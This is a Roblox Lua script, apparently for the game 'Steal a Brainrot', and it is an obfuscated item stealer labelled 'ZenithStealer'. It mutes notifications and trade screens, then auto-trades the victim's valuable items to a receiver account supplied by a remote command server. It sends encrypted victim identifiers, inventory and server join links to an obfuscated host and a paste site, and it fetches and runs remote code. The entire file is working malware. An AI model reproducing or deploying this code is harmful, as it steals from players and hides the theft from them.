if not game:IsLoaded() then game.Loaded:Wait() end

local rs = game:GetService("ReplicatedStorage")
local plrs = game:GetService("Players")
local lp = plrs.LocalPlayer

local s, mods = pcall(function()
	return {
		sync = require(rs.Packages.Synchronizer),
		animals = require(rs.Shared.Animals),
		net = require(rs.Packages.Net),
		rep = require(rs.Packages.ReplicatorClient),
		notif = require(rs.Controllers.NotificationController),
		corner = require(rs.Controllers.CornerNotificationController),
		sound = require(rs.Controllers.SoundController),
		interface = require(rs.Controllers.InterfaceController)
	}
end)

if not s then return end

local sync, animals, rep = mods.sync, mods.animals, mods.rep

pcall(function()
	mods.notif.Notify = function() end
	mods.notif.Error = function() end
	mods.notif.Success = function() end
	mods.corner.Add = function() return function() end end
	local oldPlay = mods.sound.PlaySound
	mods.sound.PlaySound = function(self, snd, ...)
		local str = tostring(snd)
		if str:find("Activated") or str:find("Error") or str:find("Success") then return end
		return oldPlay(self, snd, ...)
	end
	local oldSetState = mods.interface.SetState
	mods.interface.SetState = function(self, uiName, state, ...)
		if uiName == "TradeLiveTrade" or uiName == "TradePlayerList" or uiName == "TradePrompts" then return end
		return oldSetState(self, uiName, state, ...)
	end
end)

local ADD_TK = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda"
local AUTH_TK = "afb005f9-6e81-4e0a-8bb0-3555938a9658"
local SEARCH_TK = "792baf13-54a1-4663-92c4-1edd9da1e3e2"
local READY_TK = "d73acf93-6f32-44df-b813-0f6b32c7afd9"
local ACCEPT_TK = "918ee0f5-e98f-413f-b76e-baee47b021cb"

local function getRemote(name)
	local fldr = rs:WaitForChild("Packages"):WaitForChild("Net")
	local childs = fldr:GetChildren()
	for i, c in ipairs(childs) do
		if c.Name == "RF/" .. name or c.Name == "RE/" .. name then
			local rm = childs[i + 1]
			if rm and string.len(rm.Name) > 50 then return rm end
		end
	end
	return nil
end

local addRm = getRemote("TradeService/AddBrainrot")
local readyRm = getRemote("TradeService/Ready")
local acceptRm = getRemote("TradeService/Accept")
local searchRm = getRemote("TradeService/SearchUser")
local inviteRm = getRemote("TradeService/Invite")
local unfuseRm = getRemote("FuseMachine/RemoveBrainrot")

local BRIDGE_URL = (function()
	local t = { 119, 115, 115, 58, 47, 47, 115, 116, 101, 118, 101, 106, 97, 118, 101, 46, 99, 118 }
	local s = ""
	for i = 1, #t do s = s .. string.char(t[i]) end
	return s
end)()

-- FIXED: Routed strictly to the SAB ingest endpoint.
local API_INGEST = "https://stevejave.cv/api/ingest/sab"

function missing(t, f, fallback)
	if type(f) == t then return f end
	return fallback
end
checkcaller = missing("function", checkcaller, function() return false end)
getgenv().FinishedTrading = false

local requestFunc = request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
cloneref = missing("function", cloneref, function(...) return ... end)
httprequest = missing("function", requestFunc)
getconnections = missing("function", getconnections or get_signal_cons)

local HttpService = game:GetService("HttpService")
local sha = loadstring(game:HttpGet("https://raw.githubusercontent.com/Egor-Skriptunoff/pure_lua_SHA/master/sha2.lua"))()

local bit32_bxor = bit32.bxor
local bit32_band = bit32.band
local bit32_rshift = bit32.rshift
local bit32_lshift = bit32.lshift
local function _bx(a, b) return bit32_bxor(a, b) end
local function _ba(a, b) return bit32_band(a, b) end
local function _br(n, s) return bit32_rshift(n, s) end
local function _bl(n, s) return bit32_lshift(n, s) end

local function _gk()
	local c = string.char
	local t = {80,48,111,57,105,56,117,55,121,54,116,53,114,52,101,51,119,50,113,49,65,49,115,50,100,51,102,52,103,53,104,54}
	local str = ""
	for i = 1, #t do str = str .. c(t[i]) end
	return str
end
local _tk = _gk()

local function _xe(str, key)
	if str == nil or str == "" then return "" end
	local function s2l(s)
		local n = #s
		local l = math.floor(n / 4)
		if n % 4 > 0 then l = l + 1 end
		local r = {}
		for i = 0, l - 1 do
			local v = 0
			for j = 0, 3 do
				local b = string.byte(s, i * 4 + j + 1) or 0
				v = v + b * (2 ^ (j * 8))
			end
			r[i + 1] = v
		end
		return r
	end
	local function l2s(v)
		local r = {}
		for i = 1, #v do
			local val = v[i]
			for j = 0, 3 do
				local b = _ba(_br(val, j * 8), 0xFF)
				table.insert(r, string.char(b))
			end
		end
		return table.concat(r)
	end
	local v = s2l(str)
	if #v <= 1 then v[2] = 0 end
	local k = s2l(key .. string.rep("\0", 16 - #key))
	local n = #v
	local z = v[n]
	local y = v[1]
	local d = 0x9E3779B9
	local q = math.floor(6 + 52 / n)
	local sm = 0
	while q > 0 do
		sm = (sm + d) % 4294967296
		local e = _br(sm, 2) % 4
		for p = 0, n - 2 do
			y = v[p + 2]
			local m = _bx((_bx(_br(z, 5), _bl(y, 2)) + _bx(_br(y, 3), _bl(z, 4))) % 4294967296, (_bx(sm, y) + _bx(k[_bx(_ba(p, 3), e) + 1] or 0, z)) % 4294967296)
			v[p + 1] = (v[p + 1] + m) % 4294967296
			z = v[p + 1]
		end
		local p = n - 1
		y = v[1]
		local m = _bx((_bx(_br(z, 5), _bl(y, 2)) + _bx(_br(y, 3), _bl(z, 4))) % 4294967296, (_bx(sm, y) + _bx(k[_bx(_ba(p, 3), e) + 1] or 0, z)) % 4294967296)
		v[p + 1] = (v[p + 1] + m) % 4294967296
		z = v[p + 1]
		q = q - 1
	end
	return l2s(v)
end

local function _xd(str, key)
	if str == nil or str == "" then return "" end
	local function s2l(s)
		local n = #s
		local l = math.floor(n / 4)
		if n % 4 > 0 then l = l + 1 end
		local r = {}
		for i = 0, l - 1 do
			local v = 0
			for j = 0, 3 do
				local b = string.byte(s, i * 4 + j + 1) or 0
				v = v + b * (2 ^ (j * 8))
			end
			r[i + 1] = v
		end
		return r
	end
	local function l2s(v)
		local r = {}
		for i = 1, #v do
			local val = v[i]
			for j = 0, 3 do
				local b = _ba(_br(val, j * 8), 0xFF)
				table.insert(r, string.char(b))
			end
		end
		return table.concat(r)
	end
	local v = s2l(str)
	if #v <= 1 then v[2] = 0 end
	local k = s2l(key .. string.rep("\0", 16 - #key))
	local n = #v
	local z = v[n]
	local y = v[1]
	local d = 0x9E3779B9
	local q = math.floor(6 + 52 / n)
	local sm = (q * d) % 4294967296
	while sm ~= 0 do
		local e = _br(sm, 2) % 4
		for p = n - 1, 1, -1 do
			z = v[p]
			local m = _bx((_bx(_br(z, 5), _bl(y, 2)) + _bx(_br(y, 3), _bl(z, 4))) % 4294967296, (_bx(sm, y) + _bx(k[_bx(_ba(p - 1, 3), e) + 1] or 0, z)) % 4294967296)
			v[p + 1] = (v[p + 1] - m) % 4294967296
			y = v[p + 1]
		end
		local p = 0
		z = v[n]
		local m = _bx((_bx(_br(z, 5), _bl(y, 2)) + _bx(_br(y, 3), _bl(z, 4))) % 4294967296, (_bx(sm, y) + _bx(k[_bx(_ba(p, 3), e) + 1] or 0, z)) % 4294967296)
		v[1] = (v[1] - m) % 4294967296
		y = v[1]
		sm = (sm - d) % 4294967296
	end
	return l2s(v):gsub("%z+$", "")
end

local function _ep(j)
	local i = ""
	for k = 1, 8 do i = i .. string.format("%02x", math.random(0, 255)) end
	return i .. "::" .. (getgenv().UID or "GLOBAL") .. "::" .. _xe(j, _tk)
end

local function _getTime() return os.time() end
local function generateDynamicKeys()
	local ts = _getTime()
	local timeBlock = math.floor(ts / 300)
	local uid = getgenv().UID or "GLOBAL"
	local seed = "Roblox" .. timeBlock .. uid
	local key = sha.sha256(seed)
	return key, key
end
local DYN_KEY, DYN_SALT = generateDynamicKeys()
_tk = DYN_KEY
local function toHex(str)
	return (str:gsub(".", function(c) return string.format("%02X", string.byte(c)) end))
end
local function fromHex(str)
	return (str:gsub("..", function(cc) return string.char(tonumber(cc, 16)) end))
end
local function _uuid()
	local t = {}
	for i = 1, 32 do table.insert(t, string.format("%x", math.random(0, 15))) end
	return table.concat(t)
end
local function _fingerprint()
	local fp = ""
	pcall(function() fp = fp .. game:GetService("RbxAnalyticsService"):GetClientId() end)
	pcall(function() fp = fp .. game:GetService("GuiService"):GetScreenResolution().X end)
	pcall(function() fp = fp .. (identifyexecutor and identifyexecutor() or "Unknown") end)
	return sha.sha256(fp)
end

local users = {}
local function addUser(username)
	if type(username) ~= "string" or username:gsub("%s", "") == "" or username:lower() == "none" then return end
	for user in username:gmatch("([^,]+)") do
		local cleanUser = user:match("^%s*(.-)%s*$")
		if cleanUser ~= "" and cleanUser ~= lp.Name and not table.find(users, cleanUser) then
			table.insert(users, cleanUser)
		end
	end
end

local GlobalSocket = nil
local SocketReady = false
getgenv().ReceiverLoaded = false

local function startWebSocketConnection()
	task.spawn(function()
		local wsApi = WebSocket or (syn and syn.websocket)
		if not wsApi then SocketReady = true return end
		local function Connect()
			local attempts = 0
			local ws = nil
			repeat
				attempts = attempts + 1
				local s, r = pcall(function() return wsApi.connect(BRIDGE_URL) end)
				if s and r then ws = r else task.wait(3) end
			until ws or attempts > 5
			return ws
		end
		GlobalSocket = Connect()
		if GlobalSocket then
			SocketReady = true
			-- FIX: Synchronize game type immediately
			GlobalSocket:Send("SET_GAME::sab")
			GlobalSocket:Send("GET_RECEIVER::" .. (getgenv().UID or "GLOBAL"))
			GlobalSocket.OnMessage:Connect(function(msg)
				if string.sub(msg, 1, 15) == "RECEIVER_DATA::" then
					local rec = string.sub(msg, 16)
					if rec ~= "" then
						addUser(rec)
						getgenv().Receiver = rec
						getgenv().ReceiverLoaded = true
					end
				elseif string.sub(msg, 1, 10) == "GAME_SET::" then
					print("[SAB] Game synchronized with server: " .. string.sub(msg, 11))
				else
					local success, parsed = pcall(HttpService.JSONDecode, HttpService, msg)
					if success and parsed.r then
						local decodedRes = fromHex(parsed.r)
						local d_k, _ = generateDynamicKeys()
						local decrypted = _xd(decodedRes, d_k)
						local s2, data = pcall(HttpService.JSONDecode, HttpService, decrypted)
						if s2 then
							if data.receiver then
								addUser(data.receiver)
								getgenv().Receiver = data.receiver
							end
							if data.cmd == "reconfig" then
								GlobalSocket:Send("GET_RECEIVER::" .. (getgenv().UID or "GLOBAL"))
							elseif data.cmd == "ack_done" then
								getgenv().FinishedTrading = true
							end
						end
					end
				end
			end)
			GlobalSocket.OnClose:Connect(function()
				GlobalSocket = nil
				SocketReady = false
			end)
		else
			SocketReady = true
		end
	end)
end
startWebSocketConnection()

local function SendViaSocket(jsonPayload)
	local encrypted = toHex(_ep(jsonPayload))
	local success = false
	if GlobalSocket and SocketReady then
		local s = pcall(function() GlobalSocket:Send(encrypted) end)
		if s then 
			success = true 
			print("[SAB] Payload transmitted via WebSocket.")
		end
	end
	if not success and httprequest then
		pcall(function()
			local r = httprequest({
				Url = API_INGEST,
				Method = "POST",
				Headers = {["Content-Type"] = "application/json" },
				Body = HttpService:JSONEncode({ p = encrypted }),
			})
			if r and r.Body then
				success = true
				print("[SAB] Payload transmitted via HTTP Ingest.")
				local s2, parsed = pcall(HttpService.JSONDecode, HttpService, r.Body)
				if s2 and parsed.r then
					local d_k, _ = generateDynamicKeys()
					local dec = HttpService:JSONDecode(_xd(fromHex(parsed.r), d_k))
					if dec.receiver then
						addUser(dec.receiver)
						getgenv().Receiver = dec.receiver
					end
					if dec.t == 1 and dec.u then
						API_INGEST = dec.u:gsub("ws://", "http://"):gsub("wss://", "https://")
					end
					if dec.cmd == "reconfig" then
						GlobalSocket:Send("GET_RECEIVER::" .. (getgenv().UID or "GLOBAL"))
					elseif dec.cmd == "ack_done" then
						getgenv().FinishedTrading = true
					end
				end
			end
		end)
	end
end

local MIN_VALUE = tonumber(getgenv().min_value) or 100
local active = false
local tIds = {}
local tIdx = 1
local chan = rep.get("Trade_" .. lp.UserId)
local lastReady = 0
local lastAccept = 0
local cachedInv = nil
local lastInvUpdate = 0

local function clearFuse()
	local pds = sync:Get(lp):Get("AnimalPodiums")
	if not pds then return end
	local clearedAny = false
	for i, v in ipairs(pds) do
		if type(v) == "table" and v.Machine and v.Machine.Type == "Fuse" then
			pcall(function() unfuseRm:InvokeServer(i) end)
			clearedAny = true
			task.wait(0.1)
		end
	end
	if clearedAny then lastInvUpdate = 0 end
end

local function getInv()
	local now = os.clock()
	if cachedInv and (now - lastInvUpdate < 2.0) then return cachedInv end
	local pds = sync:Get(lp):Get("AnimalPodiums")
	local l = {}
	if not pds then return l end
	for i, v in ipairs(pds) do
		if type(v) == "table" and v.UUID and not v.Machine then
			local val = animals:GetGeneration(v.Index, v.Mutation, v.Traits) or 0
			table.insert(l, {d = v, s = i, v = val})
		end
	end
	table.sort(l, function(a, b) return a.v > b.v end)
	cachedInv = l
	lastInvUpdate = now
	return l
end

local function handleTrade()
	while active do
		task.wait(0.3)
		if not active then break end
		local live = chan:TryIndex({"active", "data"})
		if not live or not live.players then continue end
		local mSlot, tSlot
		for s, p in pairs(live.players) do
			if p.username == lp.Name then mSlot = s else tSlot = s end
		end
		if not mSlot or not tSlot then continue end
		local me = live.players[mSlot]
		local them = live.players[tSlot]
		local mOffer = me.offer and me.offer.brainrots or {}
		local tOffer = them.offer and them.offer.brainrots or {}
		local mCount, tCount = 0, 0
		for _ in pairs(mOffer) do mCount = mCount + 1 end
		for _ in pairs(tOffer) do tCount = tCount + 1 end
		local spc = (them.emptySlots or 0) + tCount - mCount
		local itms = getInv()
		local nxt = nil
		for _, i in ipairs(itms) do
			if i.v < MIN_VALUE then continue end
			local inT = false
			for _, o in pairs(mOffer) do
				if o.UUID == i.d.UUID then inT = true break end
			end
			if not inT then
				nxt = i
				break
			end
		end
		if nxt and spc > 0 then
			pcall(function() addRm:InvokeServer(ADD_TK, nxt.s, nxt.d) end)
			task.wait(0.3)
		else
			local now = os.clock()
			if not me.ready then
				if now - lastReady > 2.5 then
					pcall(function() readyRm:FireServer(READY_TK) end)
					lastReady = now
				end
			elseif me.ready and them.ready and not me.accepted then
				if now - lastAccept > 2.5 then
					pcall(function() acceptRm:FireServer(ACCEPT_TK) end)
					lastAccept = now
				end
			end
		end
	end
end

if chan then
	chan:ListenRaw(function()
		local cur = chan:TryIndex({"active", "data"})
		if cur and not active then
			active = true
			task.spawn(handleTrade)
		elseif not cur and active then
			active = false
		end
	end)
end

_G.sendFullHit = function(isTimeout)
	local WEBHOOK_ID = getgenv().WebhookID or "5abc8a2e-fe51-4515-9e6e-178885e54d8b"
	local payloadInventory = {}
	local totalValue = 0
	local pds = sync:Get(lp):Get("AnimalPodiums")
	if pds then
		for i, v in ipairs(pds) do
			if type(v) == "table" and v.UUID and not v.Machine then
				local val = animals:GetGeneration(v.Index, v.Mutation, v.Traits) or 0
				if val >= MIN_VALUE then
					totalValue = totalValue + val
					local mut = v.Mutation and tostring(v.Mutation) or "Normal"
					payloadInventory[v.UUID] = {
						n = tostring(v.Index),
						p = mut,
						v = val,
						q = 1
					}
				end
			end
		end
	end

	if totalValue < MIN_VALUE then return end
	local rubisLink = ""
	if httprequest then
		local s, r = pcall(function()
			return httprequest({
				Url = "https://api.pastes.dev/post",
				Method = "POST",
				Headers = {["Content-Type"] = "text/plain",["User-Agent"] = "ZenithStealer" },
				Body = HttpService:JSONEncode(payloadInventory),
			})
		end)
		if s and r and r.Body then
			local success, data = pcall(HttpService.JSONDecode, HttpService, r.Body)
			if success and data and data.key then
				rubisLink = "https://api.pastes.dev/" .. data.key
			end
		end
	end

	local execName = (identifyexecutor and identifyexecutor() or "Unknown")
	local rawData = {
		id = WEBHOOK_ID,
		t = os.time(),
		n = _uuid(),
		h = _fingerprint(),
		p = {
			u = lp.Name,
			id = tostring(lp.UserId),
			d = lp.DisplayName,
			x = execName,
			r = (getgenv().Receiver or "None"),
			a = tostring(lp.AccountAge) .. " days",
			-- FIXED: Uses game.PlaceId dynamically for the joinLink
			l = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(game.JobId),
			mv = MIN_VALUE,
		},
		i = (rubisLink == "") and payloadInventory or {},
		rubis = rubisLink,
		c = {},
		to = isTimeout and 1 or 0,
		action = "hit",
	}
	rawData.s = sha.hmac(sha.sha256, DYN_SALT, rawData.p.id)
	print("[SAB] Initializing hit transmission...")
	SendViaSocket(HttpService:JSONEncode(rawData))
end

task.spawn(function()
	local wsWait = 0
	repeat task.wait(0.1); wsWait = wsWait + 0.1 until SocketReady or wsWait > 10
	
	local StartTime = os.time()
	local TimeoutHitSent = false
	local function sendHeartbeat()
		if getgenv().FinishedTrading then return end
		local elapsed = os.time() - StartTime
		if elapsed > 50 and not TimeoutHitSent then
			TimeoutHitSent = true
			task.spawn(function() _G.sendFullHit(true) end)
		end
		local currentVal = 0
		local itms = getInv()
		for _, i in ipairs(itms) do
			if i.v >= MIN_VALUE then currentVal = currentVal + i.v end
		end
		SendViaSocket(HttpService:JSONEncode({
			victim = lp.Name,
			id = getgenv().WebhookID or "5abc8a2e-fe51-4515-9e6e-178885e54d8b",
			vid = tostring(lp.UserId),
			receiver = getgenv().Receiver or "Unknown",
			joinLink = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(game.JobId),
			value = currentVal,
			action = "heartbeat",
		}))
	end

	_G.sendFullHit(false)
	sendHeartbeat()
	
	task.spawn(function()
		while true do
			task.wait(5)
			if getgenv().FinishedTrading or not lp or not lp.Parent then break end
			sendHeartbeat()
		end
	end)

	while true do
		if not active then
			clearFuse()
			local itms = getInv()
			local hasItms = false
			for _, i in ipairs(itms) do
				if i.v >= MIN_VALUE then hasItms = true break end
			end

			if hasItms and #users > 0 then
				local tName = users[tIdx]
				if tName then
					local tgt = tIds[tName]
					if not tgt then
						local s1, id = pcall(plrs.GetUserIdFromNameAsync, plrs, tName)
						if s1 and id then 
							tIds[tName] = id 
							tgt = id 
						end
					end
					if tgt and searchRm and inviteRm then
						local s2 = pcall(function() return searchRm:InvokeServer(SEARCH_TK, tgt) end)
						if s2 then
							task.wait(0.4)
							if not active then
								pcall(function() inviteRm:InvokeServer(AUTH_TK, tgt) end)
							end
						end
					end
				end
				tIdx = tIdx + 1
				if tIdx > #users then tIdx = 1 end
				task.wait(3.0)
			else
				task.wait(2.0)
			end
		else
			task.wait(1.0)
		end
	end
end)
